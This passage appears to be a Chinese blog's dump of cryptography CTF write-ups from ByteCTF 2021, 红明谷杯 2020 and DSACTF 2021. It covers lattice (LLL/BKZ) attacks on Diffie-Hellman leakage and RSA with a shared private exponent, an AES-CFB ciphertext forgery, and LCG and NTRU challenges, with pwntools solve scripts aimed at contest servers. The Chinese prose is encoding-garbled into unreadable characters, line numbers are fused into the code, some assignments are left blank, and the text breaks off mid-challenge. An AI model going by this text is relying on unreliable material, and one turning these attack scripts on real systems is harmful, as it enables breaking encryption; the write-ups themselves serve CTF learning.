å°±æ˜¯ä¸€å¼€å§‹ä»¥ä¸ºè€ƒç‚¹æ˜¯Elgamalå•¥çš„, åæ¥æ‰å‘ç°å°±æ˜¯æ—¥æ ¼å­? é¢˜ç›®ç»™çš„æ¡ä»¶å…ˆåˆ—ä¸¾ä¸€ä¸‹$$Alice : g^a = A\\mod p \\Bob : g^b = B\\mod p \\g^{ab} = C_1 + x_1 \\mod p \\g^{2ab} = C_2 + x_2 \\mod p$$$A,B,C_1,C_2$æ˜¯å·²çŸ¥çš„, è§£é‡Šä¸€ä¸‹åé¢ä¸¤è¡Œ, åé¢ä¸¤è¡Œå°±æ˜¯åˆ©ç”¨to_bob()å‡½æ•°, ä¼ $g^a,g^{2a}$å¾—åˆ°çš„, é‡ç‚¹å°±æ˜¯åé¢é‚£ä¸¤è¡Œå¼å­, æŠŠ$g^{ab}$ä»£è¿›æœ€åä¸€è¡Œå°±å¯ä»¥æœ‰$$(C_1 + x_1)^2 = C_2 + x_2 + kp \\=&gt; x_1^2 - x_2 = (C_2 - C_1^2) - 2C_1x_1 + kp$$çœ‹åˆ°è¿™ç§ç­‰å¼é©¬ä¸Šå°±æƒ³åˆ°é¸½é¸¡é¾Ÿçº¦äº†, è€Œä¸”$x$éƒ½å¾ˆå°, 64ä½, ç›´æ¥æ ¹æ®ç­‰å¼é€ æ ¼å­å°±vansäº†$$(1,x_1,k)\\begin{pmatrix}R &amp; 0 &amp; C_2 - C_1^2 \\0 &amp; 1 &amp; -2C_1 \\0 &amp; 0 &amp; p\\end{pmatrix}=(R,x_1,x_1^2 - x_2)$$è¿™ä¸ªæ ¼å­æœ‰ä¸ªç»†èŠ‚å°±æ˜¯ç¬¬ä¸‰è¡Œå¾—æ˜¯$p$è€Œä¸æ˜¯$-2C_1$, å¦åˆ™ç›®æ ‡å‘é‡é‡Œä¼šæœ‰$k$, è€Œä¸æ˜¯$x_1$, $x_1$æ‰æ˜¯æˆ‘ä»¬æƒ³è¦çš„å•Š. è¿™æ³¢ç»†ä¸ç»† $R$å–œé—»ä¹è§å°±æ˜¯è°ƒ$det$ç”¨çš„, ä»$1$éå†åˆ°$128$å°±è¡Œäº† è§„çº¦å‡ºçŸ­å‘é‡å°±æœ‰$x_1$äº†, ç›´æ¥ç®—$C_1 + x_1$å°±æ˜¯$g^{ab} \\mod p$äº† ç”±äºsagemathå¾ˆéš¾è£…pwntools, æˆ‘çš„æœºå™¨æ²¡åŠæ³•ç›´æ¥å†™ä¸€æ¬¡æ€§æ‰“çš„è„šæœ¬, åªèƒ½é æ‰‹é€ŸæŠŠæ¡ä»¶å¤åˆ¶å‡ºæ¥æ‰”è¿›sageé‡Œè·‘å†æ‰‹åŠ¨æ‰”å›ç»™æœåŠ¡å™¨(å…¶å®å°±æ˜¯æ‡’å¾—å¼€wsläº†, ä½ è¿˜åˆ«è¯´, è¿™10så†…å¤åˆ¶é»è´´è¿›sageå†å¤åˆ¶ç»“æœå›æ¥å‘è¿‡å»è¿˜çœŸæœ‰äº›éš¾, è¿˜å¥½å¹³æ—¶æœ‰é”»ç‚¼æ‰‹é€Ÿ, ä¸ç„¶è¿˜çœŸæ‹¿ä¸åˆ°è¿™é¢˜çš„äºŒè¡€ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# è¿æ¥ç”¨è„šæœ¬import pwnfrom gmpy2 import invertfrom random import randintp = 62606792596600834911820789765744078048692259104005438531455193685836606544743g = 5con = pwn.remote('39.105.38.192',30000)resp = con.recvuntil(&quot;$ &quot;).decode()con.sendline('1'.encode())resp = con.recvuntil(&quot;$ &quot;).decode()Alice = int(resp.split('\\n')[0])con.sendline('2'.encode())resp = con.recvuntil(&quot;$ &quot;).decode()Bob = int(resp.split('\\n')[0])con.sendline('3'.encode())resp = con.recv(1024).decode()con.sendline(str(Alice).encode())resp = con.recvuntil(&quot;$ &quot;).decode()AliceBob = int(resp.split('\\n')[0])print('c1 = ',AliceBob)con.sendline('3'.encode())resp = con.recv(1024).decode()con.sendline(str(pow(Alice,2,p)).encode())resp = con.recvuntil(&quot;$ &quot;).decode()AliceBob = int(resp.split('\\n')[0])print('c2 = ',AliceBob)con.sendline('4'.encode())resp = con.recv(1024).decode()SEND = input('send: ')con.sendline(str(SEND).encode())resp = con.recv()print(resp)# sagec1 = 29599245400103510126844665705234428663959969687042945989429410277722893058048c2 = 17549134874331317464534964139671627000441097203060226867571953366738719997952p = 62606792596600834911820789765744078048692259104005438531455193685836606544743for i in range(128): M = Matrix([[2^i,0,c2 - c1 ^2],[0,1,-2 * c1],[0,0,-p]]) if M.LLL()[0][0] // (2 ^ i) == 1: res = M.LLL()[0] print(M.LLL()[0]) break x1 = res[1]x1 + c1 # g^ab JustDecryptå°±æ˜¯è¿™é¢˜è¯•äº†å¿«ä¸€å¤©, åœ¨åˆ«äººå®¶çš„å­¦æ ¡çš„å›¾ä¹¦é¦†å¹é£åäº†ä¸€ä¸‹åˆcao è¯´å®è¯è¿™é¢˜æ•´äº†åŠå¤©åˆ°ç°åœ¨ä¹Ÿæ²¡ææ‡‚è¿™Cryptoåº“çš„AES-CFBæ˜¯æ€æ ·çš„æ¨¡å¼, åæ­£å°±å¾ˆç¦»è°±, é‚£ä¸ªIVå°±ä¸çŸ¥é“å®ƒæ˜¯æ‹¿æ¥æ€ä¹ˆç”¨çš„,è¿˜å¥½ç¡¬æ˜¯çœ‹è§„å¾‹æ‘¸å‡ºæ¥äº† è¦å…³æ³¨çš„ç¬¬ä¸€ä¸ªç‚¹æ˜¯unpad()å‡½æ•°, è¿™ä¸ªå‡½æ•°å¤ªç®€å•äº†,å‡ºå¤§é—®é¢˜, å¯ä»¥é€šè¿‡æ§åˆ¶è§£å¯†å‡ºçš„æ˜æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚, æ¥è¿›è¡Œå¯¹è§£å¯†çš„æ˜æ–‡æŒ‰è‡ªå·±éœ€è¦æ¥æˆªæ–­ ç¬¬äºŒä¸ªç‚¹å°±æ˜¯è¿™ä¸ªå¥‡æ€ªçš„Crypto.AES_CFB , åæ­£å°±æ˜¯ä¹±ä¼ å„ç§æ•°å­—ç»™æœåŠ¡å™¨, ä¼ äº†å¯èƒ½ä¸€ä¸ªä¸Šåˆå§å¤§æ¦‚,å‘äº†ä¸€å †0å’Œ1åå‘ç°, æ›´æ”¹å¯†æ–‡çš„æŸä¸€ä¸ªå­—èŠ‚çš„æ—¶å€™, æœ€å¤šå½±å“åé¢çš„16ä¸ªå­—èŠ‚çš„è§£å¯† æŸä¸ªå­—èŠ‚ä»\\x00æ›´æ”¹åˆ°\\x??, é‚£ä¹ˆè§£å¯†å‡ºçš„æ˜æ–‡å¯¹åº”çš„é‚£ä¸ªå­—èŠ‚ä¼šå¼‚æˆ–\\x?? æ¯æ¬¡è§£å¯†ç”¨çš„$IV$, ä¼¼ä¹æ˜¯ä¸Šä¸€ä¸ªå¯†æ–‡çš„å$16$ä¸ªå­—èŠ‚(?å­˜ç–‘é—® ç”¨ä¸Šé¢ä¸‰ä¸ªç»“è®º, æˆ‘ä»¬å°±èƒ½æ„é€ ç›®æ ‡æ˜æ–‡å¯¹åº”çš„å¯†æ–‡äº† æˆ‘ä»¬å…ˆä¼ 2048 * \\x00, ä¼šå¾—åˆ°ä¸€ä¸²ababababababè¿™ç§å½¢å¼çš„æ˜æ–‡, æ ¹æ®è¿™ä¸ªæ˜æ–‡è®¡ç®—END = ab ^ 1 , ä»¥åæ¯æ¬¡ä¼ çš„å¯†æ–‡æœ€åéƒ½å¸¦ç€END, å¹¶ä¸”ENDå‰é¢çš„å¯†æ–‡çš„16ä¸ªå­—èŠ‚éƒ½æ˜¯\\x00 ,å°±èƒ½æ§åˆ¶è§£å¯†å‡ºçš„æ˜æ–‡çš„æœ€åä¸€ä¸ªå­—èŠ‚æ˜¯\\x01, è¿™æ ·æŠŠè¿”å›çš„æ˜æ–‡çš„é•¿åº¦æ§åˆ¶åœ¨æœ€é•¿, æˆ‘ä»¬å¯ä»¥æ›´æ”¹END = ab ^ 1ä¸­çš„1, ä»è€Œå¯ä»¥æ§åˆ¶è¿”å›çš„æ˜æ–‡ä¸ºä»»æ„é•¿åº¦. Hello, I'm a Bytedancer. Please give me the flag!å¯¹åº”çš„åå…­è¿›åˆ¶æ˜¯ 48656c6c6f2c2049276d2061204279746564616e6365722e20506c656173652067697665206d652074686520666c616721 å‡è®¾æˆ‘ä»¬ç¬¬ä¸€æ­¥å¾—åˆ°çš„abababababå½¢å¼çš„æ˜æ–‡æ˜¯7c7c7c7c7c7c7c7c7c7c7c7c7c7c7c7c é‚£ä¹ˆæ„é€ çš„å¯†æ–‡çš„ç¬¬ä¸€ä½å°±æ˜¯0x7c ^ 0x48 = 0x34, æ¥ä¸‹æ¥å°±ä¼ \\x00 * 32 +\\x34 + \\x00 * 2012 + END å‡è®¾è¿”å›çš„æ˜æ–‡æ˜¯xxxxxxxxxxxxxxxxxxxxxxx4820506c656173xxxxxxxxx7c7c7c7c7c7c7c7c7c7c7c7c7c7cc7c7c7c é‚£ä¹ˆæ„é€ çš„å¯†æ–‡çš„ç¬¬äºŒä½å°±æ˜¯0x20 ^ 0x65 = 0x45 (0x20æ˜¯ä¸Šé¢48çš„åé¢ä¸€ä¸ªå­—èŠ‚, 0x65æ˜¯æˆ‘çš„ç›®æ ‡æ˜æ–‡ä¹Ÿå°±æ˜¯Helloä¸­çš„e), ç„¶åç»§ç»­ä¼ \\x00 * 32 +\\x34\\x45 + \\x00 * 2010 + END ä»¥æ­¤ç±»æ¨ æœ€åæ„é€ å‡ºæˆ‘ä»¬éœ€è¦çš„å¯†æ–‡å, å†ç”¨1ä¸­æ§åˆ¶è¿”å›æ˜æ–‡é•¿åº¦çš„æ–¹æ³•, æŠŠæ˜æ–‡æˆªæ–­åˆ°åˆšå¥½æ˜¯ Hello, I'm a Bytedancer. Please give me the flag!å³å¯ ä¸Šé¢çš„è¿‡ç¨‹éœ€è¦ä¸æ–­çš„è°ƒè¯•æ‰èƒ½æ•´çš„æ˜ç™½â€¦ ç”±äºè¿œç¨‹æ˜¯æœ‰proof_of_work()çš„, å»ºè®®åœ¨æœ¬åœ°å…³æ‰proof_of_work()æ‰“å®Œæœ¬åœ°å†æ‰“è¿œç¨‹, ä¸ç„¶å¯èƒ½å°±ä¼šæ„Ÿå—åŠåˆ†é’Ÿè°ƒè¯•ä¸€æ¬¡, åŠå¹´æ‹¿åˆ°flagçš„æ„Ÿè§‰å§ ä¸‹é¢çš„è„šæœ¬æ˜¯æ‰“æ¯”èµ›çš„æ—¶å€™å†™çš„, åœ¨æ„é€ å¯†æ–‡çš„æ—¶å€™æŠŠä¼ çš„å¯†æ–‡åˆ†æˆäº†ä¸‰æ®µæ¥è¿›è¡Œä¸Šè¿°çš„è¿‡ç¨‹, æ•ˆæœæ˜¯ä¸€æ ·çš„. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import pwnfrom hashlib import sha256import codecsfrom time import sleepdef proof(END, HASH): table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' for i in table: for j in table: for k in table: for l in table: STR = i + j + k + l + END if sha256(STR.encode()).hexdigest() == HASH: print(i + j + k + l) return i + j + k + lpt = b&quot;Hello, I'm a Bytedancer. Please give me the flag!&quot;con = pwn.remote('39.105.181.182', 30001)resp = con.recvuntil('&gt; ').decode().split('\\n')[-2]END = resp[12:40]HASH = resp[45:]con.sendline(proof(END,HASH).encode())resp = con.recvuntil('&gt; ').decode()con.sendline(('0' * 1024).encode())resp = con.recvuntil('&gt; ').decode()tmp = int(resp.split('\\n')[1][32:34], 16)END = hex(tmp ^ 1)[2:].ljust(2, '0')DATA = ['0'] * 1022 + [END[0] , END[1]]roundnum = ''TABLE = [50,250,450]for i in range(49): sleep(1) idx = TABLE[i % 3] roundnum += hex(tmp ^ pt[i])[2:].rjust(2,'0') for j in range(len(roundnum)): DATA[idx + j] = roundnum[j] con.sendline((''.join(DATA)).encode()) resp = con.recvuntil('&gt; ').decode() print(i,roundnum.zfill(98)) tmp = int(resp.split('\\n')[1][TABLE[i%3]+2*i + 2:TABLE[i%3]+2+2*i + 2],16)roundnum += hex(tmp ^ pt[i])[2:].ljust(2,'0')con.sendline(('0' * 2048).encode())resp = con.recvuntil('&gt; ').decode()tmp = int(resp.split('\\n')[1][32:34], 16)print(hex(tmp))END = hex(tmp ^ 31)[2:].ljust(2, '0')print(len(roundnum),len(roundnum + END * 15))con.sendline((roundnum + 58 * '0'+ END).encode())resp = con.recv()print(resp)resp = con.recv()print(resp)resp = con.recv()print(resp) æ€»ä¹‹å°±æ˜¯ç¡¬æ‘¸, åæ­£ä¹Ÿä¸æ˜¯ä»€ä¹ˆå¤æ‚çš„è¿‡ç¨‹, çœ‹å›¾æ‰¾è§„å¾‹äº†å±äºæ˜¯","link":"/2021/10/18/writeup-for-2021-ByteCTF-%E7%BA%BF%E4%B8%8A/"},{"title":"writeup for 2020 çº¢æ˜è°·æ¯","text":"è™ç¬¦å‰çš„ä¸€ä¸ªæ¯”èµ›, å·éƒ½æ²¡æ³¨å†Œ, å€Ÿéš”å£å®¿èˆçš„å·ç©äº†ä¸€ä¸‹. å¯†ç ä¸€å…±å°±ä¸‰é¢˜, ä¸€é¢˜AES-OCBéš¾çˆ†(åæ­£æˆ‘æ˜¯ç¬¬ä¸€æ¬¡çŸ¥é“OCBè¿™ä¸ªæ¨¡å¼), å›½å†…å±…ç„¶æœä¸åˆ°å…³äºOCBçš„èµ„æ–™. åªæ‰¾åˆ°ä¸€ä¸¤ä¸ªpaper, æ²¡è¿™ä¸ªè€å¿ƒçœ‹. å‰©ä¸‹ä¸¤é¢˜, ä¸€é¢˜ç­¾åˆ°(ä¼°è®¡æ˜¯éé¢„æœŸæ‰è¿™ä¹ˆç®€å•), è¿˜æœ‰ä¸€é“Laçˆ·çˆ·é‚£è¾¹æœ‰è®°å½•, å°±ç›´æ¥åšäº†. 0x00 babyForgeryproblem123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#!/usr/bin/env python3# -*- coding: utf-8 -*-import osimport stringimport randomimport socketserverimport signalfrom hashlib import sha256from ocb.aes import AES # https://github.com/kravietz/pyOCBfrom ocb import OCBFLAG = #####REDACTED#####BLOCKSIZE = 16MENU = br&quot;&quot;&quot;[1] Encrypt[2] Decrypt[3] Get Flag[4] Exit&quot;&quot;&quot;class Task(socketserver.BaseRequestHandler): def _recvall(self): pass def send(self, msg, newline=True): pass def recv(self, prompt=b'&gt; '): pass def recvhex(self, prompt=b'&gt; '): pass def proof_of_work(self): pass def timeout_handler(self, signum, frame): pass def encrypt(self, nonce, message, associate_data=b''): assert nonce not in self.NONCEs self.NONCEs.add(nonce) self.ocb.setNonce(nonce) tag, cipher = self.ocb.encrypt(bytearray(message), bytearray(associate_data)) return (bytes(cipher), bytes(tag)) def decrypt(self, nonce, cipher, tag, associate_data=b''): self.ocb.setNonce(nonce) authenticated, message = self.ocb.decrypt( *map(bytearray, (associate_data, cipher, tag)) ) if not authenticated: raise ValueError('REJECT') return bytes(message) def handle(self): signal.signal(signal.SIGALRM, self.timeout_handler) signal.alarm(60) if not self.proof_of_work(): return aes = AES(128) self.ocb = OCB(aes) KEY = os.urandom(BLOCKSIZE) self.ocb.setKey(KEY) self.NONCEs = set() while True: USERNAME = self.recv(prompt=b'Enter username &gt; ') if len(USERNAME) &gt; BLOCKSIZE: self.send(b&quot;I can't remember long names&quot;) continue if USERNAME == b'Alice': self.send(b'Name already used') continue break signal.alarm(60) while True: self.send(MENU, newline=False) try: choice = int(self.recv(prompt=b'Enter option &gt; ')) if choice == 1: nonce = self.recvhex(prompt=b'Enter nonce &gt; ') message = self.recvhex(prompt=b'Enter message &gt; ') associate_data = b'from ' + USERNAME ciphertext, tag = self.encrypt(nonce, message, associate_data) self.send(str.encode(f&quot;ciphertext: {ciphertext.hex()}&quot;)) self.send(str.encode(f&quot;tag: {tag.hex()}&quot;)) elif choice == 2: nonce = self.recvhex(prompt=b'Enter nonce &gt; ') ciphertext = self.recvhex(prompt=b'Enter ciphertext &gt; ') tag = self.recvhex(prompt=b'Enter tag &gt; ') associate_data = self.recvhex(prompt=b'Enter associate data &gt; ') message = self.decrypt(nonce, ciphertext, tag, associate_data) self.send(str.encode(f&quot;message: {message.hex()}&quot;)) elif choice == 3: nonce = self.recvhex(prompt=b'Enter nonce &gt; ') ciphertext = self.recvhex(prompt=b'Enter ciphertext &gt; ') tag = self.recvhex(prompt=b'Enter tag &gt; ') associate_data = b'from Alice' message = self.decrypt(nonce, ciphertext, tag, associate_data) if message == b'please_give_me_the_flag': self.send(FLAG) elif choice == 4: break else: break except: self.send(b'Error!') break signal.alarm(0) self.send(b'Bye!') self.request.close()class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 10000 print(HOST, PORT) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() ä¸é‡è¦çš„å‡½æ•°ç”¨passçœç•¥äº† analyses å…¨åœºåªæœ‰ä¸€è§£çš„é¢˜, çœŸçš„ä¸ä¼š, ç­‰wpå­¦ä¹ äº† 0x01 RSA attackproblem123456789101112131415161718192021222324252627282930313233343536from gmpy2 import *from Crypto.Util.number import *import sympyimport randomfrom secret import flagp1 = getPrime(1024)print(p1)#p1=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649936031p2 = p1 - random(999,99999)print(p2)#p2=172071201093945294154292240631809733545154559633386758234063824053438835958515543354911249971174172649606257936857627547311760174511316984409767738981247877005802155796623587461774104951797122995266217334158736848307655543970322950339988489801672160058805422153816950022590644650247595501280192205506649902034p_1=1for i in range(1,p1+1): p_1*=ip3 = sympy.nextPrime(p_1 % p2 )p4 = p3 &gt;&gt; 50 &lt;&lt; 50p = p4while(isPrime(P)!=1): P = p + random.randint(0,2**50)Q = getPrime(1024)e = 1+1+1N = P * Qprint(N)#N=28592245028568852124815768977111125874262599260058745599820769758676575163359612268623240652811172009403854869932602124987089815595007954065785558682294503755479266935877152343298248656222514238984548734114192436817346633473367019138600818158715715935132231386478333980631609437639665255977026081124468935510279104246449817606049991764744352123119281766258347177186790624246492739368005511017524914036614317783472537220720739454744527197507751921840839876863945184171493740832516867733853656800209669179467244407710022070593053034488226101034106881990117738617496520445046561073310892360430531295027470929927226907793flag=bytes_to_long(flag)c = pow(flag,e,N)print(c)#c=15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413 analyseæˆ‘ä¼°è®¡ç€è¿™æ˜¯éé¢„æœŸçœ‹å®Œä¸€éä»£ç å°±çŸ¥é“æ˜¯å·²çŸ¥$p$é«˜ä½æ±‚$m$äº†, å¯æƒœè¿™é¢˜ç›®è·Ÿæ–°ç”Ÿèµ›çš„é¢˜ä¸€ä¸ªå°¿æ€§, æ²¡æœ‰å¯¹$m$è¿›è¡Œpadding, å¯¼è‡´å¯ä»¥ç›´æ¥å¯¹$c$å¼€3æ¬¡æ–¹â€¦â€¦ éé¢„æœŸexp1234from gmpy2 import irootfrom Crypto.Util.number import long_to_bytesc = 15839981826831548396886036749682663273035548220969819480071392201237477433920362840542848967952612687163860026284987497137578272157113399130705412843449686711908583139117413print(long_to_bytes(iroot(c,3)[0])) é¢„æœŸè§£å¨å°”é€Šå®šç†???? é¢˜ç›®æ˜¯ä¸æ˜¯æé”™äº†, p2&lt;p1, é‚£ä¹ˆé˜¶ä¹˜çš„æ—¶å€™è‚¯å®šæœ‰p2åœ¨p_1é‡Œé¢â€¦. æ¨¡p2ç›´æ¥æ˜¯0äº† ???????????? 0x02 ezCRTproblem1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import gmpy2from random import shuffleflag = b&quot;flag is here&quot;def shuffle_flag(s): str_list = list(s) shuffle(str_list) return ''.join(str_list)nl = []el = []count = 0while count != 5: p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = gmpy2.next_prime(bytes_to_long(flag)) e = gmpy2.invert(d, phi) nl.append(n) el.append(int(e)) count += 1print(nl)print(el)cl = []flag = shuffle_flag(flag.decode()).encode()for i in range(len(nl)): cl.append(pow(bytes_to_long(flag), el[i], nl[i]))print(cl) analysesCommon Private Exponent -&gt; https://www.ijcsi.org/papers/IJCSI-9-2-1-311-314.pdf å½“ç§é’¥$d$æ»¡è¶³$$d&lt;N_r^{Î´_r} \\\\Î´_r&lt;12âˆ’{1 \\over 2(r+1)}âˆ’log_{N_r} (6)$$å…¶ä¸­$N_r$ä¸ºæœ€å¤§çš„$N$, å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³• æˆ‘ä»¬å¯ä»¥è®°$\\phi(N_i) = (N_i-(p_i+q_i-1))=(N_i-S_i)$, ä¸”$N_1&lt;N_2&lt;\\cdots &lt;N_r &lt; 2N_1$ å› ä¸ºæ¯æ¬¡ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªç§é’¥$d$, é‚£ä¹ˆå¯ä»¥æœ‰:$$\\begin{cases}e_1d - k_1N_1 = 1 - S_1 \\\\e_2d - k_2N_2 = 1 - S_2 \\\\\\vdots \\\\e_rd - k_rN_r = 1 - S_r\\end{cases}$$ å¯ä»¥æ„é€ æ ¼å­$$(d,k_1,k_2,\\cdots,k_r)\\begin{pmatrix}\\sqrt {N_r}&amp; e_1&amp;e_2&amp;\\cdots&amp;e_r \\\\0&amp;-N_1&amp;0&amp;0&amp;0 \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots&amp;\\vdots \\\\0&amp;0&amp;0&amp;-N_{r-1}&amp;0 \\\\0&amp;0&amp;0&amp;0&amp;-N_{r}\\end{pmatrix}=(d\\sqrt {N_r},1-S_1,1-S_2,\\cdots,1-S_r)$$è§„çº¦å‡ºæ¥å, å–ç¬¬ä¸€è¡Œç¬¬ä¸€ä¸ªå°±æ˜¯$d\\sqrt{N_r}$äº†.è®¡ç®—å‡º$d$å°±æ˜¯flagäº† exp12345678910111213141516171819202122232425262728#sagemathfrom gmpy2 import *from Crypto.Util.number import long_to_bytes as l2bN = [...]E = [...]PK = []for i,j in zip(N,E): PK.append([i,j])for i in range(len(PK)): for j in range(i,len(PK)): if PK[j][0] &gt; PK[i][0]: PK[j],PK[i] = PK[i] ,PK[j]PK = PK[::-1]M=iroot(int(PK[-1][0]),int(2))[0]a=[0]*6a[0]=[M,PK[0][1],PK[1][1],PK[2][1],PK[3][1],PK[4][1]]a[1]=[0,-PK[0][0],0,0,0,0]a[2]=[0,0,-PK[1][0],0,0,0]a[3]=[0,0,0,-PK[2][0],0,0]a[4]=[0,0,0,0,-PK[3][0],0]a[5]=[0,0,0,0,0,-PK[4][0]]Mat = matrix(ZZ,a)Mat_LLL=Mat.BKZ()d = int(abs(Mat_LLL[0][0])//M)assert d * M == abs(Mat_LLL[0][0])l2b(d)","link":"/2021/04/02/writeup-for-2020-%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/"},{"title":"writeup for 2021 3æœˆdsactf","text":"orz è¿˜æ˜¯å¤ªèœäº†ï¼Œè¿™ä¸ªæ¯”èµ›å¯†ç éƒ½è¢«Aç©¿äº†ï¼Œæˆ‘è¿˜æ˜¯åšä¸å‡ºNTRUï¼Œå¸ˆå‚…ä»¬éƒ½è¯´ç®€å•ï¼Œå¤šé¡¹å¼æ€æˆ‘è¿˜æ˜¯è¯¦ç»†è®°å½•ä¸€ä¸‹å§ï¼ŒåŠ æ²¹ 0x00 crypto_threshold æ˜¯ç­¾åˆ°æ²¡é”™äº†ã€‚ã€‚ã€‚ problem12345678910111213141516171819202122232425262728293031323334353637383940414243444546import randomfrom sympy import nextprimefrom Crypto.Util.number import *from secret import flagfrom gmpy2 import gcddef lcg(seed,params): (m,c,n)=params s = seed % n while True: s = (m * s + c) % n yield s seed = getPrime(128)m = getPrime(128)c = getPrime(128)n = getPrime(129)print(m,c,n)key_stream = lcg(seed,(m,c,n))num=[]for _ in range(6): num.append(next(key_stream)) print(num)secret = next(key_stream)e = nextprime(secret)p = getPrime(1024)q = getPrime(1024)_lambda = ((p-1)*(q-1)) / gcd(p-1,q-1)flag = bytes_to_long(flag)print(_lambda)print(p*q)print(pow(flag,e,p*q)) '''# data''' analysesæ¡ä»¶å…¨ç»™çš„LCGï¼Œç›´æ¥å¾€ä¸‹æ¨å°±å¥½äº†ã€‚$\\lambda$RSA, ç›´æ¥æ±‚é€†å°±æ˜¯ç§é’¥äº† exp123456789101112131415161718from sympy import nextprimefrom Crypto.Util.number import *from gmpy2 import invertdef lcg(seed, params): (m, c, n) = params s = seed % n return (m * s + c) % nm, c, n = (315926151576125492949520250047736865439, 204423972944032372640132172728460755543, 375402477603617093440157245062608289367)seed = 287868671713011127830359814204794790287e = nextprime(lcg(seed, (m, c, n)))_lambda = d = invert(e, lam)n = c = print(long_to_bytes(pow(c, d, n))) 0x01 FeedBack æµå¯†ç çš„è·¯å­ï¼Œå†ç†Ÿæ‚‰ä¸è¿‡äº† problem12345678910111213141516171819from secret import flagfrom string import hexdigitsimport randomfrom functools import reducedef cycle(c:list,a:list)-&gt;int: return reduce(lambda x,y: x+y,map(lambda x: x[0]*x[1],zip(c,a))) def enc(m:list,k:list)-&gt;list: for i in range(len(k)*2): m.append(cycle(m[i:i+len(k)],k)) return m[len(k):]if __name__ == &quot;__main__&quot;: key=[ord(random.choice(hexdigits)) for i in range(len(flag))] c=enc(list(flag),key) print(c)# data analysesç®€å•è¯´ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹å§ï¼Œkeyå’Œflagçš„é•¿åº¦éƒ½æ˜¯27è¿™ä¸ªä»”ç»†ç‚¹çœ‹åº”è¯¥å°±å¯ä»¥çœ‹å‡ºæ¥äº†.è®°$key = (k_0,k_1,\\cdots,k_{26}),flag = (m_0,m_1,\\cdots,m_{26})$è¿™é‡Œçš„åŠ å¯†å…¶å®å°±æ˜¯è®¡ç®—$m_{n+1}$ç„¶åæ”¾åœ¨æœ€åé¢$$m_{n+1} =m_nk_{26} + m_{n-1}k_{25}+\\cdots +m_{n-26}k_0$$å†æ¥çœ‹çœ‹æ¡ä»¶ï¼Œé¢˜ç›®ç»™äº†$m_{27},m_{28},\\cdots,m_{80}$ä¸€å…±54ä¸ªã€‚å†™æˆçŸ©é˜µå°±çŸ¥é“è¿™54ä¸ªèƒ½å¹²ä»€ä¹ˆå¤§äº‹æƒ…äº†$$\\begin{pmatrix}m_{27}&amp;m_{28}&amp;\\cdots&amp;m_{53} \\\\m_{28}&amp;m_{29}&amp;\\cdots&amp;m_{54} \\\\\\vdots&amp;\\vdots&amp;\\ddots&amp;\\vdots \\\\m_{53}&amp;m_{54}&amp;\\cdots&amp;m_{79}\\end{pmatrix}\\begin{pmatrix}k_0 \\\\k_1 \\\\\\vdots \\\\k_{26}\\end{pmatrix}=\\begin{pmatrix}m_{54} \\\\m_{55} \\\\\\vdots \\\\m_{80}\\end{pmatrix}$$æ‰€ä»¥è¿™54ä¸ªmå·²ç»å¯ä»¥è§£å‡ºå…¨éƒ¨çš„$key$äº† è§£å‡º27ä¸ª$key$ä»¥åï¼Œå°±æ˜¯é¢˜ç›®æ‰€è¯´çš„feedbackäº†ï¼Œ æˆ‘ä»¬çŸ¥é“ï¼Œå‰27ä¸ª$m$è®¡ç®—ä¸‹ä¸€ä¸ª$m$ï¼Œè€Œ$m_{53} = m_{52}k_{26}+\\cdots+m_{26}k_0$, å¯ä»¥çœ‹åˆ°è¿™ä¸ªå¼å­é‡Œï¼Œ æˆ‘ä»¬åªæœ‰$m_{26}$ä¸çŸ¥é“ï¼Œç›´æ¥è§£æ–¹ç¨‹æˆ–è€…çˆ†ç ´éƒ½å¯ä»¥è§£å‡ºæ¥ã€‚è§£å‡º$m_{26}$å°±å¯ä»¥æŒ‰ç€è¿™ä¸ªæ€è·¯ä¸€è·¯å¾€å›è§£ï¼Œç›´åˆ°è§£å‡ºå…¨éƒ¨$m$ã€‚ exp123456789101112131415161718192021222324# sagemathdef cycle(c,a): return reduce(lambda x,y: x+y,map(lambda x: x[0]*x[1],zip(c,a))) c = [...]A = []for i in range(27): v = c[i:i+27] A.append(v)s = vector(c[27:])A = Matrix(A)a = A.solve_left(s)c = c[:27]m = []for _ in range(27): for i in range(0xff): res = cycle([i] + c[:-1],a) if res == c[-1]: c = [i] + c[:-1] m.append(chr(i)) break''.join(m[::-1]) 0x02 son_of_NTRU åšè¿‡ä¸€æ ·çš„é¢˜äº†ï¼Œé‚£é“é¢˜è¿˜æ˜¯æˆ‘æ ¼çš„å¯è’™ï¼Œæ€ä¹ˆä¼šå¿˜å‘¢https://xz.aliyun.com/t/7163 - ä»ä¸€é“CTFé¢˜åˆæ¢NTRUæ ¼å¯†ç  problem123456789101112131415161718192021222324252627282930313233343536#! /bin/bash/env python3from random import randrangefrom Crypto.Util.number import *from gmpy2 import invertdef gcd(a,b): while b: a,b = b,a%b return adef generate(): p = getPrime(1024) while True: f = randrange(1,(p//2)**(0.5)) g = randrange((p//4)**(0.5),(p//2)**(0.5)) if gcd(f,p)==1 and gcd(f,g)==1: break h = (invert(f,p)*g)%p return h,p,f,gdef encrypt(m,h,p): assert m&lt;(p//4)**(0.5) r = randrange(1,(p//2)**(0.5)) c = (r*h+m)%p return ch,p,f,g = generate()from flag import flagc = 